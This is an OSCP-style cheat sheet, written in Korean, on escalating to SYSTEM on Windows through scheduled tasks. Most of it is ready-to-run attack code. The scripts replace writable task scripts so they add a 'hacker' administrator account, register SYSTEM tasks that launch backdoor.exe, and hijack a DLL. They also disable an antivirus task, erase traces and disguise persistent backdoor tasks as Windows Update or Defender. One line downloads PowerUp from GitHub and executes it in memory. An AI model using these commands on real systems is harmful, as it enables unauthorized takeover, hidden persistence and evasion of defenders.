# Windows Scheduled Tasks Privilege Escalation

> **OSCP 핵심**: Windows 스케줄된 작업을 악용하여 즉시 SYSTEM 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 스케줄된 작업 발견 (30초 안에)

```cmd
:: 모든 스케줄된 작업 나열
schtasks /query /fo LIST /v | findstr "TaskName\|Run As User\|Task To Run"

:: 관리자/SYSTEM 권한으로 실행되는 작업들
schtasks /query /fo LIST /v | findstr /C:"Run As User" /A:5 | findstr "SYSTEM\|Administrator\|Administrators"

:: 활성화된 작업들만
schtasks /query /fo LIST | findstr "TaskName\|Status" | findstr /B "TaskName\|Ready\|Running"

:: CSV 형태로 출력 (파싱 용이)
schtasks /query /fo CSV | findstr /V "TaskName"
```

```powershell
# PowerShell 버전
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath, State
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*SYSTEM*" -or $_.Principal.UserId -like "*Administrator*"}

# 상세 정보 포함
Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName, LastRunTime, NextRunTime, NumberOfMissedRuns
```

### 🎯 실행 파일 권한 확인 (즉시)

```cmd
:: 특정 작업의 상세 정보
schtasks /query /tn "TaskName" /fo LIST /v

:: 실행 파일 권한 확인 (accesschk 필요)
for /f "tokens=*" %i in ('schtasks /query /fo csv ^| findstr /V "TaskName"') do @echo %i

:: icacls로 파일 권한 확인
icacls "C:\Path\To\Scheduled\Task\Executable.exe"
icacls "C:\Scripts\ScheduledScript.bat"

:: 스케줄된 작업 디렉토리 권한
icacls "C:\Windows\System32\Tasks"
icacls "C:\Windows\Tasks"
```

### ⚡ 작업 실행 시간 확인

```cmd
:: 다음 실행 시간 확인
schtasks /query /fo LIST /v | findstr "Next Run Time\|TaskName"

:: 실행 히스토리 확인
schtasks /query /fo LIST /v | findstr "Last Run Time\|Last Result\|TaskName"

:: 트리거 정보 확인
schtasks /query /tn "TaskName" /fo LIST /v | findstr "Schedule Type\|Start Time\|Start Date"
```

## 📋 단계별 체크리스트

### Phase 1: 스케줄된 작업 발견 및 분류 (2분)

- [ ] **모든 작업 나열**: `schtasks /query` 전체 작업 목록 확인
- [ ] **권한별 분류**: SYSTEM, Administrator, 일반 사용자 권한 작업 구분
- [ ] **상태 확인**: Ready, Running, Disabled 상태별 분류
- [ ] **실행 경로 확인**: 각 작업의 실행 파일이나 스크립트 경로
- [ ] **트리거 조건**: 실행 조건 및 스케줄 확인

### Phase 2: 권한 분석 (3분)

- [ ] **실행 파일 권한**: 스케줄된 작업이 실행하는 파일들의 권한
- [ ] **스크립트 권한**: .bat, .ps1, .vbs 등 스크립트 파일 권한
- [ ] **디렉토리 권한**: 실행 파일이 위치한 디렉토리 권한
- [ ] **DLL 의존성**: 실행 파일이 로드하는 DLL들의 위치와 권한
- [ ] **작업 생성 권한**: 새로운 스케줄된 작업 생성 권한

### Phase 3: 트리거 조건 분석 (2분)

- [ ] **시간 기반**: 매일, 매주, 매월 실행되는 작업들
- [ ] **이벤트 기반**: 로그온, 부팅, 특정 이벤트 발생시 실행
- [ ] **즉시 실행**: 수동으로 트리거할 수 있는 작업들
- [ ] **조건부 실행**: 특정 조건 만족시에만 실행되는 작업들
- [ ] **대기 시간**: 다음 실행까지 남은 시간 확인

### Phase 4: 익스플로잇 실행 (3-5분)

- [ ] **파일 교체**: 쓰기 가능한 실행 파일이나 스크립트 교체
- [ ] **DLL 하이재킹**: 실행 파일이 로드하는 DLL 교체
- [ ] **새 작업 생성**: 권한이 있는 경우 새 관리자 작업 생성
- [ ] **트리거 대기**: 작업 실행 시간까지 대기 또는 수동 실행
- [ ] **결과 확인**: 권한상승 성공 여부 및 지속성 확보

## 🎯 발견별 즉시 익스플로잇

### 📝 쓰기 가능한 실행 파일 교체

```cmd
:: 1. 취약한 스케줄된 작업 확인
schtasks /query /tn "VulnerableTask" /fo LIST /v

:: 2. 실행 파일 권한 확인
icacls "C:\Scripts\vulnerable_script.bat"

:: 3. 원본 파일 백업
copy "C:\Scripts\vulnerable_script.bat" "C:\Scripts\vulnerable_script.bat.bak"

:: 4. 악성 스크립트로 교체
echo net user hacker password123 /add > "C:\Scripts\vulnerable_script.bat"
echo net localgroup administrators hacker /add >> "C:\Scripts\vulnerable_script.bat"
echo %ORIGINAL_COMMANDS% >> "C:\Scripts\vulnerable_script.bat"

:: 5. 수동으로 작업 실행 (권한이 있는 경우)
schtasks /run /tn "VulnerableTask"

:: 6. 또는 다음 스케줄 실행 대기
schtasks /query /tn "VulnerableTask" /fo LIST /v | findstr "Next Run Time"

:: 7. 원본 파일 복구 (흔적 제거)
copy "C:\Scripts\vulnerable_script.bat.bak" "C:\Scripts\vulnerable_script.bat"
```

```powershell
# PowerShell로 스크립트 교체
# 1. 취약한 작업 찾기
$task = Get-ScheduledTask | Where-Object {$_.Actions.Execute -like "*.bat" -or $_.Actions.Execute -like "*.ps1"}

# 2. 실행 파일 경로 확인
$execPath = $task.Actions.Execute

# 3. 파일 권한 확인
Get-Acl $execPath | Where-Object {$_.AccessToString -match $env:USERNAME}

# 4. 악성 스크립트 생성
$maliciousScript = @"
net user hacker password123 /add
net localgroup administrators hacker /add
"@

# 5. 원본 백업 후 교체
Copy-Item $execPath "$execPath.bak"
$maliciousScript | Out-File -FilePath $execPath -Encoding ASCII

# 6. 작업 수동 실행
Start-ScheduledTask -TaskName $task.TaskName
```

### 🔧 디렉토리 권한 악용

```cmd
:: 1. 실행 파일이 있는 디렉토리 권한 확인
icacls "C:\Scripts\"

:: 2. 디렉토리에 쓰기 권한이 있는 경우
:: 원본 실행 파일명과 동일한 악성 파일 생성

:: 3. 실행 파일 이름 확인
schtasks /query /tn "VulnerableTask" /fo LIST /v | findstr "Task To Run"

:: 4. 같은 이름의 악성 실행 파일 생성
echo @echo off > "C:\Scripts\original_name.bat"
echo net user hacker password123 /add >> "C:\Scripts\original_name.bat"
echo net localgroup administrators hacker /add >> "C:\Scripts\original_name.bat"

:: 5. 원본 파일을 다른 이름으로 변경하고 악성 파일이 실행되도록 함
ren "C:\Scripts\original_name.bat" "C:\Scripts\original_name.bat.old"
```

### 📁 새로운 스케줄된 작업 생성

```cmd
:: 1. 스케줄된 작업 생성 권한 확인
schtasks /create /tn "TestTask" /tr "cmd.exe" /sc once /st 23:59 /ru SYSTEM

:: 2. 권한이 있는 경우 관리자 계정 생성 작업
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c net user hacker password123 /add & net localgroup administrators hacker /add" /sc onstart /ru SYSTEM

:: 3. 즉시 실행되는 작업 생성
schtasks /create /tn "SecurityUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc once /st %TIME% /ru SYSTEM

:: 4. 작업 실행
schtasks /run /tn "SecurityUpdate"

:: 5. 작업 삭제 (흔적 제거)
schtasks /delete /tn "SecurityUpdate" /f
```

```powershell
# PowerShell로 새 스케줄된 작업 생성
# 1. 작업 액션 정의
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"net user hacker password123 /add; net localgroup administrators hacker /add`""

# 2. 트리거 정의 (즉시 실행)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)

# 3. 보안 주체 정의 (SYSTEM 권한)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# 4. 작업 등록
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -Principal $principal

# 5. 즉시 실행
Start-ScheduledTask -TaskName "SystemMaintenance"

# 6. 작업 삭제
Unregister-ScheduledTask -TaskName "SystemMaintenance" -Confirm:$false
```

### 🔗 DLL 하이재킹

```cmd
:: 1. 스케줄된 작업의 실행 파일 확인
schtasks /query /tn "VulnerableTask" /fo LIST /v | findstr "Task To Run"

:: 2. 실행 파일이 로드하는 DLL 확인 (Dependency Walker나 Process Monitor 사용)
:: 또는 일반적인 DLL 하이재킹 대상들 확인

:: 3. 실행 파일과 같은 디렉토리에 악성 DLL 배치
:: 예: version.dll, dwmapi.dll, comctl32.dll 등

:: 4. 악성 DLL 생성 (C++ 코드)
/*
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("net user hacker password123 /add & net localgroup administrators hacker /add");
    }
    return TRUE;
}
*/

:: 5. DLL 컴파일
gcc -shared -o version.dll dllmain.c -Wl,--out-implib,version.lib

:: 6. DLL을 실행 파일 디렉토리에 배치
copy version.dll "C:\Scripts\version.dll"

:: 7. 스케줄된 작업 실행 대기
```

### 📅 작업 스케줄 조작

```cmd
:: 1. 기존 작업의 스케줄 변경 (권한이 있는 경우)
schtasks /change /tn "VulnerableTask" /st 00:01

:: 2. 작업을 즉시 실행되도록 변경
schtasks /change /tn "VulnerableTask" /sc once /st %TIME%

:: 3. 작업의 실행 파일 경로 변경 (권한이 있는 경우)
schtasks /change /tn "VulnerableTask" /tr "C:\Windows\Temp\evil.exe"

:: 4. 작업의 실행 사용자 변경
schtasks /change /tn "VulnerableTask" /ru SYSTEM

:: 5. 작업 비활성화 (방해 요소 제거)
schtasks /change /tn "AntivirusTask" /disable
```

## 🤖 자동화 도구 활용

### 🔍 PowerUp 스케줄된 작업 분석

```powershell
# PowerUp 다운로드 및 실행
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 스케줄된 작업 관련 모든 검사
Invoke-AllChecks | Where-Object {$_ -like "*Scheduled*" -or $_ -like "*Task*"}

# 개별 스케줄된 작업 검사
Get-ScheduledTaskComHandler
Get-ModifiableScheduledTaskFile

# 취약한 스케줄된 작업 실행
Invoke-ScheduledTaskAbuse -TaskName "VulnerableTask" -Command "net user hacker password123 /add"
```

### 🎯 WinPEAS 스케줄된 작업 정보

```cmd
:: WinPEAS 스케줄된 작업 관련 정보만 추출
winPEAS.exe | findstr /i "scheduled\|task\|schtasks"

:: 특정 검사만 실행
winPEAS.exe scheduledtasks
```

### 🔧 스케줄된 작업 종합 스캔 스크립트

```cmd
:: 스케줄된 작업 취약점 스캔 스크립트 (복붙용)
@echo off
echo ===== WINDOWS SCHEDULED TASKS EXPLOITATION SCAN =====
echo.

echo [+] Listing all scheduled tasks...
schtasks /query /fo LIST | findstr "TaskName\|Status" | findstr /B "TaskName\|Ready"
echo.

echo [+] Tasks running as SYSTEM or Administrator...
schtasks /query /fo LIST /v | findstr /C:"Run As User" /A:5 | findstr "SYSTEM\|Administrator"
echo.

echo [+] Checking task file permissions...
if exist accesschk.exe (
    for /f "tokens=*" %%i in ('schtasks /query /fo csv ^| findstr /V "TaskName"') do @(
        for /f "tokens=1,2 delims=," %%a in ("%%i") do @(
            echo Checking task: %%a
            schtasks /query /tn %%a /fo LIST /v | findstr "Task To Run" | for /f "tokens=3*" %%c in ('findstr "Task To Run"') do @accesschk.exe -f %%c 2>nul | findstr "RW\|F"
        )
    )
) else (
    echo AccessChk not found. Download from: https://download.sysinternals.com/files/AccessChk.zip
)
echo.

echo [+] Next run times...
schtasks /query /fo LIST /v | findstr "TaskName\|Next Run Time" | findstr /B "TaskName\|Next Run Time"
echo.

echo ===== SCAN COMPLETE =====
```

```powershell
# PowerShell 스케줄된 작업 종합 스캔 스크립트 (복붙용)
Write-Host "===== WINDOWS SCHEDULED TASKS EXPLOITATION SCAN =====" -ForegroundColor Green

Write-Host "`n[+] Active scheduled tasks..." -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath

Write-Host "`n[+] Tasks running with high privileges..." -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest" -or $_.Principal.UserId -like "*SYSTEM*"} | Select-Object TaskName, @{Name="RunAs";Expression={$_.Principal.UserId}}, @{Name="RunLevel";Expression={$_.Principal.RunLevel}}

Write-Host "`n[+] Checking task file permissions..." -ForegroundColor Yellow
Get-ScheduledTask | ForEach-Object {
    $action = $_.Actions | Where-Object {$_.Execute}
    if ($action -and $action.Execute) {
        $path = $action.Execute
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            try {
                $acl = Get-Acl $path -ErrorAction Stop
                if ($acl.AccessToString -match $env:USERNAME -or $acl.AccessToString -match "Everyone" -or $acl.AccessToString -match "Users") {
                    Write-Host "VULNERABLE: $($_.TaskName) - $path" -ForegroundColor Red
                }
            } catch {}
        }
    }
}

Write-Host "`n[+] Next run times..." -ForegroundColor Yellow
Get-ScheduledTask | Get-ScheduledTaskInfo | Where-Object {$_.NextRunTime} | Select-Object TaskName, NextRunTime | Sort-Object NextRunTime

Write-Host "`n===== SCAN COMPLETE =====" -ForegroundColor Green
```

## 👀 놓치기 쉬운 것들

### 🚨 숨겨진 스케줄된 작업들

```cmd
:: 1. Microsoft 폴더 내의 시스템 작업들
schtasks /query /fo LIST /v | findstr "\\Microsoft\\"

:: 2. 사용자별 스케줄된 작업 (다른 사용자)
for /f "tokens=1 delims=:" %%i in ('net user ^| findstr /V "command\|----\|User accounts"') do @schtasks /query /s localhost /u %%i 2>nul

:: 3. 숨겨진 작업들 (Task Scheduler 폴더 직접 확인)
dir /a /b "C:\Windows\System32\Tasks" | findstr /V "Microsoft"
dir /a /b "C:\Windows\System32\Tasks\Microsoft" | head -20

:: 4. AT 명령어로 생성된 레거시 작업들
at
wmic job get JobId,Name,Owner,DaysOfWeek,DaysOfMonth,ElapsedTime,Status

:: 5. 레지스트리의 스케줄된 작업 정보
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"

:: 6. 이벤트 로그의 작업 실행 기록
wevtutil qe Microsoft-Windows-TaskScheduler/Operational /c:10 /rd:true /f:text

:: 7. 조건부 실행 작업들 (idle, AC power 등)
schtasks /query /fo LIST /v | findstr "Idle\|AC Power\|Battery"

:: 8. 사용자 로그온 시 실행되는 작업들
schtasks /query /fo LIST /v | findstr "At log on\|At startup"

:: 9. WMI 이벤트 기반 작업들
wmic process where "name='WmiPrvSE.exe'" get ProcessId,CommandLine

:: 10. PowerShell 스크립트로 실행되는 작업들
schtasks /query /fo LIST /v | findstr "powershell"
```

### 🔍 고급 스케줄된 작업 분석

```powershell
# 1. COM 핸들러를 사용하는 작업들
Get-ScheduledTask | Where-Object {$_.Actions.ClassId} | Select-Object TaskName, @{Name="ClassId";Expression={$_.Actions.ClassId}}

# 2. 네트워크 조건이 있는 작업들
Get-ScheduledTask | Where-Object {$_.Settings.NetworkSettings} | Select-Object TaskName, @{Name="NetworkId";Expression={$_.Settings.NetworkSettings.Id}}

# 3. 다중 액션을 가진 작업들
Get-ScheduledTask | Where-Object {$_.Actions.Count -gt 1} | Select-Object TaskName, @{Name="ActionCount";Expression={$_.Actions.Count}}

# 4. 특정 사용자로만 실행되는 작업들
Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "SYSTEM" -and $_.Principal.UserId -ne $null} | Select-Object TaskName, @{Name="RunAsUser";Expression={$_.Principal.UserId}}

# 5. 실행 시간 제한이 있는 작업들
Get-ScheduledTask | Where-Object {$_.Settings.ExecutionTimeLimit} | Select-Object TaskName, @{Name="TimeLimit";Expression={$_.Settings.ExecutionTimeLimit}}

# 6. 우선순위가 설정된 작업들
Get-ScheduledTask | Where-Object {$_.Settings.Priority -ne 7} | Select-Object TaskName, @{Name="Priority";Expression={$_.Settings.Priority}}

# 7. 실패시 재시작 설정이 있는 작업들
Get-ScheduledTask | Where-Object {$_.Settings.RestartCount -gt 0} | Select-Object TaskName, @{Name="RestartCount";Expression={$_.Settings.RestartCount}}

# 8. 여러 트리거를 가진 작업들
Get-ScheduledTask | Where-Object {$_.Triggers.Count -gt 1} | Select-Object TaskName, @{Name="TriggerCount";Expression={$_.Triggers.Count}}

# 9. 이벤트 기반 트리거를 가진 작업들
Get-ScheduledTask | Where-Object {$_.Triggers.CimClass.CimClassName -eq "MSFT_TaskEventTrigger"} | Select-Object TaskName

# 10. XML 정의를 가진 복잡한 작업들
Get-ScheduledTask | ForEach-Object {
    $xml = [xml](Export-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath)
    if ($xml.Task.Actions.ComHandler) {
        Write-Host "COM Handler Task: $($_.TaskName)" -ForegroundColor Yellow
    }
}
```

### ⚡ 스케줄된 작업 실행 트리거링

```cmd
:: 1. 수동으로 작업 즉시 실행
schtasks /run /tn "TaskName"

:: 2. 작업 상태 모니터링
schtasks /query /tn "TaskName" /fo LIST /v | findstr "Status\|Last Run Time\|Last Result"

:: 3. 로그오프/로그온 트리거 작업 실행
logoff
:: 다시 로그인

:: 4. 시스템 재시작 트리거 작업 실행
shutdown /r /t 0

:: 5. 특정 이벤트 발생시키기 (이벤트 기반 작업용)
eventcreate /t information /id 1000 /l application /so "TestApp" /d "Test event for task trigger"

:: 6. 대기 상태 진입 (idle 트리거 작업용)
rundll32.exe powrprof.dll,SetSuspendState 0,1,0

:: 7. AC 전원 연결/해제 시뮬레이션 (배터리 트리거 작업용)
:: 물리적으로는 불가능하지만 WMI 이벤트로 시뮬레이션 가능

:: 8. 사용자 로그온 이벤트 트리거
runas /user:OtherUser cmd

:: 9. 시간 변경으로 시간 기반 작업 트리거
time 23:59
:: 시간을 작업 실행 시간으로 변경

:: 10. 프로세스 시작/종료 이벤트 트리거
start notepad
taskkill /im notepad.exe /f
```

### 🔧 스케줄된 작업 지속성 및 은닉

```cmd
:: 1. 정상적인 시스템 작업으로 위장
schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\Automatic App Update" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 03:00 /ru SYSTEM

:: 2. 여러 트리거를 가진 작업 생성
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM
schtasks /create /tn "SystemMaintenance2" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM

:: 3. 조건부 실행으로 탐지 회피
schtasks /create /tn "IdleTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onidle /i 10 /ru SYSTEM

:: 4. 랜덤 시간 지연으로 패턴 회피
schtasks /create /tn "RandomTask" /tr "timeout %RANDOM% & C:\Windows\Temp\backdoor.exe" /sc daily /st 02:00 /ru SYSTEM

:: 5. 다중 액션 작업 (정상 작업 + 악성 작업)
:: XML 파일 생성 필요 (복잡한 작업 정의)

:: 6. 이벤트 기반 실행 (특정 이벤트 발생시에만)
schtasks /create /tn "EventTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onevent /ec Application /mo "*[System[EventID=1000]]" /ru SYSTEM

:: 7. 네트워크 연결 기반 실행
:: 특정 네트워크에 연결될 때만 실행되도록 설정

:: 8. 사용자별 작업 생성 (권한이 낮아도 가능)
schtasks /create /tn "UserTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon

:: 9. 작업 설명 및 작성자 위조
schtasks /create /tn "WindowsDefender" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 03:00 /ru SYSTEM /f
:: XML 직접 편집으로 Author, Description 등 수정

:: 10. 복수의 백업 작업 생성
for /l %%i in (1,1,5) do schtasks /create /tn "BackupTask%%i" /tr "C:\Windows\Temp\backdoor%%i.exe" /sc daily /st 0%%i:00 /ru SYSTEM
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: 모든 스케줄된 작업 나열 및 권한별 분류
- **다음 3분**: 실행 파일 권한 분석 및 자동화 도구 실행
- **추가 2분**: 발견된 취약점에 대한 즉시 익스플로잇 시도
- **시간 고려**: 스케줄된 작업은 실행 시간까지 대기가 필요할 수 있음

### 🎯 성공률 높은 순서

1. **실행 파일 교체**: 쓰기 가능한 스크립트나 실행 파일 (거의 확실)
2. **새 작업 생성**: 관리자 권한이 있는 경우 즉시 SYSTEM 작업 생성
3. **DLL 하이재킹**: 실행 파일이 로드하는 DLL 교체 (높은 성공률)
4. **디렉토리 권한**: 실행 파일 디렉토리에 쓰기 권한 있을 때
5. **스케줄 조작**: 기존 작업의 실행 시간이나 파일 경로 변경

### 🔥 즉시 시도할 것들

- 관리자/SYSTEM 권한 작업들 우선 확인
- 실행 파일이 스크립트(.bat, .ps1)인 경우 즉시 권한 확인
- PowerUp이나 WinPEAS로 자동 스캔 실행
- 수동 실행 가능한 작업들 즉시 테스트

### 💡 팁

- 스케줄된 작업은 Windows privesc의 중요한 벡터 중 하나
- 실행 시간까지 기다려야 하는 경우가 많으므로 시간 계획 중요
- 여러 작업을 병렬로 확인하여 효율성 증대
- 성공 후 지속성 확보를 위해 여러 백도어 작업 생성
- 정상 시스템 작업으로 위장하여 탐지 회피
- XML 형식의 복잡한 작업 정의 활용 가능
